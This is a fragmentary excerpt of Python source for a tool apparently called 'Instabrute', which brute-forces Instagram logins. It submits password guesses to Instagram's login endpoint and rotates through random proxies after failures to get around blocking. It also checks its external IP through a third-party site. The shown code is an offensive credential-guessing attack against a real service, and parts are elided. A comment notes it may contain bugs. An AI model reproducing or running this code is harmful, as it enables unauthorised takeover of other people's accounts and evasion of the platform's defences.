...
class Instabrute():
    ...
    def randomProxy(self):
        ...
        try:
            print('')
            print('[*] Check new ip...')
            print('[*] Your public ip: %s' % requests.get('http://myexternalip.com/raw',
                                                          proxies={"http": proxy, "https": proxy}, timeout=10.0).text)
    ...
    def Login(self, password):
        ...
        sess.cookies.update(
            {'sessionid': '', 'mid': '', 'ig_pr': '1', 'ig_vw': '1920', 'csrftoken': '', 's_network': '',
             'ds_user_id': ''})
        sess.headers.update({
        ...
        r = sess.post('https://www.instagram.com/accounts/login/ajax/',
                      data={'username': self.username, 'password': password}, allow_redirects=True)
        sess.headers.update({'X-CSRFToken': r.cookies.get_dict()['csrftoken']})
        ...
        if (data['status'] == 'fail'):
            ...
            if (UsePorxy == 'Y' or UsePorxy == 'YES'):
                ...
                Instabrute.randomProxy()  # Check that, may contain bugs
            return False
